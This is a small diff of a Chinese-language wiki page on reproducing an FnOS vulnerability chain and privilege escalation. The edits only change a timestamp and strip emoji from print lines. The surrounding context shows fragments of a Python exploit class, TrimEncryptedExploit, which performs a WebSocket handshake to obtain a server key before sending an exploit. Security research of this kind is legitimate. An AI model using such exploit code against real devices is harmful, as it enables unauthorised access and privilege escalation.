@@ -2,7 +2,7 @@
 title: FnOS漏洞链的复现以及提权
 description: FnOS漏洞链的复现以及提权
 published: true
-date: 2026-02-03T18:05:26.827Z
+date: 2026-02-03T18:05:35.755Z
 tags: 
 editor: markdown
 dateCreated: 2026-02-03T18:04:10.570Z
@@ -121,7 +121,7 @@ class TrimEncryptedExploit:
             if self.step == 1 and "pub" in data:
                 self.server_pub_key = data["pub"]
                 self.si = str(data["si"])
-                print(f"✅ [1/2] 握手成功")
+                print(f" [1/2] 握手成功")
                 print(f"    SI: {self.si}")
                 print(f"    Pub Key 获取成功 ({len(self.server_pub_key)} bytes)")
                 
@@ -143,7 +143,7 @@ class TrimEncryptedExploit:
                 ws.close()
 
         except Exception as e:
-            print(f"❌ 异常: {e}")
+            print(f" 异常: {e}")
             ws.close()
 
     def send_exploit(self, ws):
